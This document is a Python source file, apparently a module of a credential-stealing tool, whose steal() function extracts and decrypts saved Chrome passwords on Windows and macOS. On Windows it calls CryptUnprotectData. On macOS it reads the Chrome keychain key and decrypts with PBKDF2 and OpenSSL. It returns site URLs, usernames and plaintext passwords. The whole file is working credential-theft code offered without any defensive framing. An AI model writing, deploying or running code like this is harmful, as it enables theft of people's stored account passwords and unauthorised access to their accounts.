# Common imports
import platform
import sqlite3
import os
# Windows imports
if platform.system() == "Windows":
	import win32crypt
	import sys
# OSX imports
elif platform.system() == 'Darwin':
	import binascii
	import subprocess
	import base64
	from hashlib import pbkdf2_hmac

def query_db(db_path):
	# Try to open the SQLite3 database
	try:
		conn = sqlite3.connect(db_path)
		cursor = conn.cursor()
	except:
		return ('[-] Couldn\'t open the database')
	# Execute the query
	try:
		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
	except:
		return ('[-] Error getting the passwords')
	# Fetch all data
	return cursor.fetchall()

def steal():
	# Do only if on Windows or Mac, Linux support will be added later
	if platform.system() == "Windows":
		return steal_windows()
	elif platform.system()=='Darwin':
		return steal_osx()
	return("[-] "+platform.system()+"is not supported.")
# OSX part
def steal_osx():
	# Recovered list
	recovered = list()
	# Get the passwords
	data = query_db(os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'))
	# Get the encrpytion key from the keychain
	safe_storage_key = subprocess.Popen(
		"security find-generic-password -wa "
		"'Chrome'",
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE,
		shell=True)
	stdout, stderr = safe_storage_key.communicate()
	safe_storage_key = stdout.replace("\n", "")
	# Catch keychain errors
	if stderr:
		return("[-]Chrome entry not found in keychain.")
	if not stdout:
		return("[-]You clicked deny.")
	# Are there any passwords?
	if len(data) > 0:
		# Loop through the passwords
		for result in data:
	  		#Setup the initialisation vector
	  		iv = ''.join(('20', ) * 16)

			# Setup the decryption key
			key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
			hex_key = binascii.hexlify(key)

			# Decrpyt the password with the key
			hex_enc_password = base64.b64encode(result[2][3:])

			# Send any error messages to /dev/null to prevent screen bloating up
			# (any decryption errors will give a non-zero exit, causing exception)
			try:
				if hex_enc_password:
					# Decrpyt with OpenSSL
					password = subprocess.check_output(
						"openssl enc -base64 -d "
						"-aes-128-cbc -iv '"+iv+"' -K "+hex_key+" <<< "+
						hex_enc_password+" 2>/dev/null",
						shell=True)
					# If the URL is blank,print it as (Unknown)
					if(len(result[0]) <= 0):
						result[0] = "(Unknown)"
					# If the username is blank,say so
					if(len(result[1]) <= 0):
						result[1] = "(Blank)"
					# If the password is blank,say so
					if(len(password) <= 0):
						password = "(Blank)"
					recovered.append("[+] URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
			except subprocess.CalledProcessError:
				pass
		return recovered
	else:
		# There are no saved passwords
		return('[-] There are no saved passwords')

# Windows part
def steal_windows():
	# Recovered list
	recovered = list()
	# Get the passwords
	data = query_db(os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data')
	# Check if there is any data
	if len(data) > 0:
		for result in data:
			# Decrypt the Password
			try:
				# The good/bad thing about the Chrome passwords is that they are easily decryptable
				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			except:
				# If it fails no biggie try another one
				pass
			# If the password is found
			if password:
				# If the URL is blank,print it as (Unknown)
				if(len(result[0]) <= 0):
					result[0] = "(Unknown)"
				# If the username is blank,say so
				if(len(result[1]) <= 0):
					result[1] = "(Blank)"
				# If the password is blank,say so
				if(len(password) <= 0):
					password = "(Blank)"
				# Append the result
				recovered.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
		return recovered
	else:
		# There are no saved passwords
		return('[-] There are no saved passwords')
